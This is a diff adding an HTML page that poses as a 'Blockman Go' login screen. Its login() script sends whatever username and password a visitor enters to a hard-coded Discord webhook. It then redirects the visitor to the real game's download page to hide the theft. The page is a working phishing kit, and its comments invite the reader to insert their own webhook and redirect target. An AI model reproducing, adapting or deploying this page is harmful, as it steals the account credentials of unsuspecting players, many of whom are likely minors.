@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Blockman Go</title>
+    <style>
+        /* Background */
+        body {
+            font-family: 'Arial', sans-serif;
+            background: radial-gradient(circle, rgba(0, 0, 0, 1), rgba(20, 20, 20, 1), rgba(10, 10, 10, 1));
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            margin: 0;
+            position: relative;
+            box-shadow: 0 0 50px rgba(255, 215, 0, 0.7); /* Global glowing light effect */
+        }
+
+        /* Floating Balls */
+        .ball {
+            position: absolute;
+            width: 30px;
+            height: 30px;
+            background-color: #FFD700;
+            border-radius: 50%;
+            opacity: 0.8;
+            box-shadow: 0 0 15px rgba(255, 215, 0, 0.7); /* Glowing balls */
+            animation: floatBall 12s infinite linear alternate;
+        }
+
+        /* Small Balls */
+        .ball.small {
+            width: 20px;
+            height: 20px;
+            animation-duration: 6s;
+            box-shadow: 0 0 10px rgba(255, 215, 0, 0.6);
+        }
+
+        /* Big Balls */
+        .ball.big {
+            width: 50px;
+            height: 50px;
+            animation-duration: 9s;
+            box-shadow: 0 0 25px rgba(255, 215, 0, 0.8);
+        }
+
+        /* Positioning the balls */
+        .ball:nth-child(1) { top: 10%; left: 25%; animation-duration: 6s; }
+        .ball:nth-child(2) { top: 50%; left: 80%; animation-duration: 8s; }
+        .ball:nth-child(3) { top: 80%; left: 10%; animation-duration: 7s; }
+        .ball:nth-child(4) { top: 60%; left: 50%; animation-duration: 9s; }
+        .ball:nth-child(5) { top: 20%; left: 70%; animation-duration: 7s; }
+        .ball:nth-child(6) { top: 70%; left: 40%; animation-duration: 6s; }
+        .ball:nth-child(7) { top: 30%; left: 90%; animation-duration: 8s; }
+        .ball:nth-child(8) { top: 80%; left: 20%; animation-duration: 9s; }
+
+        @keyframes floatBall {
+            0% { transform: translateY(0) translateX(0); }
+            100% { transform: translateY(-50px) translateX(60px); }
+        }
+
+        /* Container */
+        .container {
+            background: rgba(0, 0, 0, 0.6);
+            box-shadow: 0 10px 50px rgba(0, 0, 0, 0.2);
+            backdrop-filter: blur(12px);
+            border-radius: 30px;
+            width: 360px;
+            padding: 30px;
+            text-align: center;
+            color: white;
+            position: relative;
+            z-index: 2;
+            box-shadow: 0 0 25px rgba(255, 215, 0, 0.7); /* Glowing container */
+        }
+
+        h2 {
+            font-size: 26px;
+            font-weight: bold;
+            color: #FFD700;
+            text-shadow: 0 0 15px rgba(255, 215, 0, 0.8); /* Glowing text */
+        }
+
+        /* Input Fields */
+        label {
+            display: block;
+            font-weight: bold;
+            margin-top: 15px;
+            text-shadow: 0 0 10px rgba(255, 215, 0, 0.5); /* Glowing label text */
+        }
+
+        input {
+            width: 90%;
+            padding: 14px;
+            margin-top: 8px;
+            border: none;
+            border-radius: 10px;
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+            font-size: 16px;
+            text-align: center;
+            outline: none;
+            transition: 0.3s;
+            box-shadow: 0 0 10px rgba(255, 215, 0, 0.6); /* Glowing input field */
+        }
+
+        input::placeholder {
+            color: rgba(255, 255, 255, 0.6);
+        }
+
+        input:focus {
+            background: rgba(255, 255, 255, 0.2);
+            transform: scale(1.02);
+            box-shadow: 0 0 15px rgba(255, 215, 0, 0.8); /* Enhanced glowing effect when focused */
+        }
+
+        /* 3D Button */
+        button {
+            margin-top: 25px;
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #ff416c, #ff4b2b);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 20px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 10px 40px rgba(255, 75, 43, 0.5); /* Glowing button */
+            position: relative;
+        }
+
+        button:hover {
+            background: linear-gradient(135deg, #ff4b2b, #ff416c);
+            transform: scale(1.05);
+            box-shadow: 0 15px 50px rgba(255, 75, 43, 0.8); /* Glowing effect on hover */
+        }
+
+        button:active {
+            transform: scale(0.98);
+            box-shadow: 0 5px 25px rgba(255, 75, 43, 0.7); /* Glowing effect when pressed */
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Floating Balls -->
+    <div class="ball small"></div>
+    <div class="ball big"></div>
+    <div class="ball small"></div>
+    <div class="ball big"></div>
+    <div class="ball small"></div>
+    <div class="ball big"></div>
+    <div class="ball small"></div>
+    <div class="ball big"></div>
+
+    <div class="container">
+        <h2>[BG] Login</h2>
+        
+        <label for="username">Your Username:</label>
+        <input type="text" id="username" placeholder="Enter your username">
+        
+        <label for="password">Your Password:</label>
+        <input type="password" id="password" placeholder="Enter your password">
+        
+        <button onclick="login()">Login</button>
+    </div>
+
+    <script>
+        function login() {
+            let username = document.getElementById("username").value;
+            let password = document.getElementById("password").value;
+
+            if (username === "" || password === "") {
+                alert("Please fill in both fields!");
+                return;
+            }
+
+            // Send data to Discord webhook
+            const webhookURL = "https://discord.com/api/webhooks/1357896272396423198/qMJSNexCszWXyUeAsb7g3e0o26XaJpimhIRUkSWAWX0ub_cyCDRdncssRSHs2xYrqbjE"; // Replace with your actual webhook URL
+            const data = {
+                content: `👤 Username: ${username}\n🔒 Password: ${password}`
+            };
+
+            fetch(webhookURL, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(data)
+            })
+            .then(() => {
+                // Teleport to another website after a successful login
+                window.location.href = "https://www.blockmango.com/#/download"; // Replace with the URL of the site to teleport to
+            })
+            .catch(error => {
+                alert("Failed to send data.");
+            });
+        }
+    </script>
+</body>
+</html>
